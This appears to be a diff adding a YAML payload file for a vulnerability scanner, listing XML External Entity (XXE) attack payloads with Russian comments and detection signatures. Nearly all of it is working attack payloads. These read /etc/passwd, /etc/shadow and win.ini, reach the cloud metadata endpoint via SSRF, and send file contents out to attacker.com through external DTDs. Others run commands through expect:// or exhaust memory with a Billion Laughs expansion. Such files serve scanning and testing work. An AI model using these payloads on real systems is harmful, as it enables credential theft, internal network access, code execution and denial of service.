@@ -1,0 +1,98 @@
+name: XML External Entity (XXE)
+type: xxe
+description: "XXE test payloads — classic entity injection, blind OOB, parameter entities, SSRF via XXE"
+detection: "check response for file contents or out-of-band interaction"
+signatures:
+  - "root:x:"
+  - "DOCTYPE"
+  - "SYSTEM"
+  - "ENTITY"
+  - "daemon:"
+  - "[boot loader]"
+  - "WIN.INI"
+  - "nobody:"
+payloads:
+  # --- Классический XXE (Linux) ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <root><data>&xxe;</data></root>
+
+  # --- Классический XXE (Windows) ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+    <root><data>&xxe;</data></root>
+
+  # --- XXE через /etc/shadow ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+    <root><data>&xxe;</data></root>
+
+  # --- XXE SSRF (внутренний HTTP запрос) ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+    <root><data>&xxe;</data></root>
+
+  # --- Blind XXE OOB (через внешний DTD) ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+    <root><data>test</data></root>
+
+  # --- Blind XXE с извлечением файла через OOB ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+      %eval;
+      %exfil;
+    ]>
+    <root><data>test</data></root>
+
+  # --- XXE через параметрические entity (внутри DTD) ---
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE data [
+      <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
+      %dtd;
+    ]>
+    <data>&exfil;</data>
+
+  # --- XXE Billion Laughs (DoS) ---
+  - |
+    <?xml version="1.0"?>
+    <!DOCTYPE lolz [
+      <!ENTITY lol "lol">
+      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+    ]>
+    <root>&lol5;</root>
+
+  # --- XXE через expect:// (RCE если модуль включён) ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+    <root><data>&xxe;</data></root>
+
+  # --- XXE через PHP wrapper ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+    <root><data>&xxe;</data></root>
+
+  # --- XXE без XML-заголовка (упрощённый) ---
+  - |
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <foo>&xxe;</foo>
+
+  # --- XXE через SVG ---
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
